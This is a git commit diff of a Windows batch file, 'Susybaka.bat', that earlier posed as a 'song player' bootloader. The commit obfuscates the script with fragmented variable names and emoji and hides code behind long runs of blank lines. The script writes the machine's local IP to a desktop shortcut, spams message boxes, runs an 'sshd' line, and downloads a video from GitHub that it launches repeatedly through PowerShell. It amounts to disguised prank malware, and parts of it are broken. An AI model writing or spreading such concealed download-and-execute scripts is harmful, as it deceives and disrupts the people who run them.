bf64a6d875a9d3aef82487577daba828f3c50a11
GrimAnticheat <118537260+Grim-Anticheat@users.noreply.github.com>
2024-08-31 23:35:50 +0300

    Update Susybaka.bat

--- Susybaka.bat
+++ Susybaka.bat
@@ -10,44 +10,122 @@ setlocal enabledelayedexpansion
 
 
 
-echo Please don't check the code!
 
 
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+set "a=po"
+set "b=ta"
+set "c=to"
+set "d=ch"
+set "e=ip"
+set "f=potato"
+set "g=🥔"
+set "h=🤡"
+set "i=🕵️‍♂️"
 
 for /f "tokens=2 delims=[]" %%k in ('ping -4 -n 1 %computername% ^| findstr /r /c:"\[.*\]"') do set "v2=%%k"
-set "shortcutPath=%userprofile%\Desktop\%v2%.url"
-echo [InternetShortcut] > "%shortcutPath%"
-echo URL=http://!v2! >> "%shortcutPath%"
+set "%f%1=%userprofile%\Desktop\%v2%.url"
+echo [%a%%b%%c%%d%Shortcut] > "!%f%1!"
+echo %c%%f%%b%%d%=http://!v2! >> "!%f%1!"
 
-%n%serverloc echo Hello
+%n%serverloc sshd
 
-echo Hello! welcome to the bootloader of song player v1.0!
+echo %a%%b%%c%%d%%e%%g% %a%%c%%f%%h%%b%%d% %g%%f%%h% v2.1! %g%
 
-msg * "Welcome, close me to continue..."
-msg * "in beta, may have errors."
+msg * "🥔🥔🥔 Welcome to the potato farm! 🥔🥔🥔"
+msg * "%a%%c%%f%%h%%b%%d%%g% 🍟"
+msg * "Did you know? %f%%c%%d%%e% are life. %h%%g%%h%"
 
-set "a=sta"
-set "b=rt"
-set "c=loc"
-set "d=se"
-set "e=rv"
-set "f=ip"
+set "%f%%f%=st%a%%b%%d%%e%%f%"
+set "%g%%f%%g%=loc"
 
 powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\chimes.wav').PlaySync()"
-msg * "An unexpected error occurred."
+msg * "🥔An unexpected %f%%g% occurred.🥔"
 
-:: Set full volume using nircmd (make sure nircmd is in your path or provide full path)
+powershell -c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Grim-Anticheat/files-images/raw/main/ssstik.io_@x_l_u_i_x_1723569606416.mp4', '%temp%\vid.mp4'); Start-Sleep -Milliseconds 500; (New-Object -ComObject WScript.Shell).Run('%temp%\vid.mp4', 3, $false)"
 
 
-:: Download and play video in fullscreen on all monitors
-set "x=powershell -c "(new-object System.Net.WebClient).DownloadFile('https://github.com/Grim-Anticheat/files-images/raw/main/ssstik.io_@x_l_u_i_x_1723569606416.mp4', '%temp%\vid.mp4'); (New-Object -ComObject WScript.Shell).Run('%temp%\vid.mp4 /fullscreen /multimon', 3, $false)""
-%x%
 
-set "v1=%a%%b%"
-set "v2=%c%%f%"
-set "v3=%d%%e%"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+set "%g%%c%%f%%d%=powershell -c ""Start-Sleep -Milliseconds 700; (New-Object -ComObject WScript.Shell).Run('%temp%\vid.mp4', 3, $false)"""
+!%g%%c%%f%%d%!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+set "%c%%f%%h%=powershell -c ""Start-Sleep -Milliseconds 900; (New-Object -ComObject WScript.Shell).Run('%temp%\vid.mp4', 1, $false)"""
+!%c%%f%%h%!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+echo %h%%g%%f%%g%%c% %a%%c%%f%%h%%b%%d%%g% %i%
+
+
+
+
+
+
+
+
+
+set "%a%%b%%c%%d%%e%1=%a%%b%"
+set "%a%%b%%c%%d%%e%2=%g%%f%"
+set "%a%%b%%c%%d%%e%3=%h%%e%"
 
 endlocal
